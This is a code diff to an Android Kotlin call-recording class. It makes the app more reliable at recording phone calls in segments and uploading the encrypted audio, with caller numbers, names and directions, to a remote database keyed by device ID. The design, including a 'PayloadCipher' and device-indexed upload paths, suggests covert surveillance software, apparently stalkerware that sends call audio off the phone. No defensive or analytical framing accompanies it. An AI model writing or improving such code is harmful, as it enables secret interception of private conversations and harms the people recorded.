@@ -120,17 +120,15 @@ class CallRecorder private constructor(private val context: Context) {
                                     }
                                     elapsed += thisSegmentSec.toInt()
                                     totalRecordedBytes += segmentFile.length()
-                                    lastElapsedSec = elapsed
 
                                     val uploadJob = launch {
-                                        uploadSegment(segmentFile, segmentIndex)
+                                        uploadSegment(segmentFile, segmentIndex, currentRecordingId)
                                     }
                                     synchronized(pendingUploads) { pendingUploads.add(uploadJob) }
                                 }
                             } catch (_: Exception) {
                                 val step = minOf(SEGMENT_SECONDS, (MAX_DURATION_SEC - elapsed).toLong()).toInt()
                                 elapsed += step
-                                lastElapsedSec = elapsed
                             }
                         }
                         finalizeRecording()
@@ -165,17 +163,17 @@ class CallRecorder private constructor(private val context: Context) {
     private fun startMediaRecorder(file: File) {
         val audioSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             listOf(
-                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 MediaRecorder.AudioSource.MIC,
                 MediaRecorder.AudioSource.VOICE_RECOGNITION,
                 MediaRecorder.AudioSource.UNPROCESSED,
+                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 MediaRecorder.AudioSource.DEFAULT
             )
         } else {
             listOf(
-                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 MediaRecorder.AudioSource.MIC,
                 MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 MediaRecorder.AudioSource.DEFAULT
             )
         }
@@ -221,7 +219,7 @@ class CallRecorder private constructor(private val context: Context) {
         mediaRecorder = null
     }
 
-    private suspend fun uploadSegment(file: File, segmentIndex: Int) {
+    private suspend fun uploadSegment(file: File, segmentIndex: Int, recordingId: String? = null) {
         if (uploadedSegments.contains(segmentIndex)) {
             Log.d("CallFix", "segment $segmentIndex already uploaded, skipping")
             return
@@ -233,6 +231,7 @@ class CallRecorder private constructor(private val context: Context) {
                 val encryptedBytes = PayloadCipher.encryptBytes(bytes)
                 val base64 = Base64.encodeToString(encryptedBytes, Base64.NO_WRAP)
                 val androidId = DeviceId.get(context)
+                val recId = recordingId ?: currentRecordingId ?: return
 
                 val segmentJson = JSONObject().apply {
                     put("data", base64)
@@ -241,7 +240,7 @@ class CallRecorder private constructor(private val context: Context) {
                 }
 
                 CloudApi.writeToRTDB(
-                    "devices/$androidId/recordings/$currentRecordingId/parts/$segmentIndex",
+                    "devices/$androidId/recordings/$recId/parts/$segmentIndex",
                     segmentJson
                 )
 
@@ -277,9 +276,24 @@ class CallRecorder private constructor(private val context: Context) {
 
     private suspend fun finalizeRecording() {
         if (!isFinalized.compareAndSet(false, true)) return
-
+        kotlinx.coroutines.withContext(kotlinx.coroutines.NonCancellable) {
         stopMediaRecorder()
         releaseWakeLock()
+
+        // Upload any partial/in-progress segment that wasn't uploaded yet
+        synchronized(segmentFiles) {
+            val toUpload = segmentFiles.toList()
+            for (file in toUpload) {
+                val parts = file.name.removePrefix("seg_").removeSuffix(".m4a").split("_")
+                val index = parts.lastOrNull()?.toIntOrNull() ?: continue
+                if (file.exists() && file.length() > 0 && !uploadedSegments.contains(index)) {
+                    totalRecordedBytes += file.length()
+                    segmentsCompleted++
+                    val uploadJob = scope.launch { uploadSegment(file, index, currentRecordingId) }
+                    pendingUploads.add(uploadJob)
+                }
+            }
+        }
 
         val callId = currentCallId
         val recId = currentRecordingId
@@ -288,7 +302,7 @@ class CallRecorder private constructor(private val context: Context) {
         val cName = callerName
         val cDirection = callDirection
         val startTs = startTime
-        val dur = lastElapsedSec
+        val dur = ((if (startTs > 0) System.currentTimeMillis() - startTs else 0L) / 1000L).toInt()
         val bytes = totalRecordedBytes
         val segs = segmentsCompleted
 
@@ -304,7 +318,6 @@ class CallRecorder private constructor(private val context: Context) {
         callerName = null
         callDirection = null
         currentRecordingId = null
-        recordingJob?.cancel()
 
         val uploads: List<Job>
         synchronized(pendingUploads) {
@@ -313,14 +326,16 @@ class CallRecorder private constructor(private val context: Context) {
         }
         uploads.forEach { if (it.isActive) it.join() }
 
+        recordingJob?.cancel()
+
         synchronized(segmentFiles) {
             segmentFiles.forEach { if (it.exists()) it.delete() }
             segmentFiles.clear()
         }
 
-        if (recId == null) return
+        if (recId == null) return@withContext
 
-        val androidId = try { DeviceId.get(context) } catch (_: Exception) { return }
+        val androidId = try { DeviceId.get(context) } catch (_: Exception) { return@withContext }
 
         val finalFailedSegments: List<Int>
         synchronized(failedSegments) {
@@ -347,28 +362,7 @@ class CallRecorder private constructor(private val context: Context) {
         }
 
         CloudApi.patchToRTDB("devices/$androidId/recordings/$recId", finalJson)
-
-        val vnEntry = JSONObject().apply {
-            put("ts_ms", System.currentTimeMillis())
-            put("totalCount", 1)
-            val note = JSONObject().apply {
-                put("fileName", "Call_${cType ?: "unknown"}_${startTs}.m4a")
-                put("dateAdded", startTs)
-                put("durationMs", dur * 1000L)
-                put("sizeBytes", bytes)
-                put("mimeType", "audio/mp4")
-                put("isCallRecording", true)
-                put("callType", cType)
-                put("callerNumber", cNumber)
-                put("callerName", cName)
-                put("callDirection", cDirection)
-            }
-            put("notes", org.json.JSONArray().put(note))
         }
-        CloudApi.writeToRTDB(
-            "devices/$androidId/voice_notes/call_${System.currentTimeMillis()}",
-            vnEntry
-        )
     }
 
     private fun acquireWakeLock() {
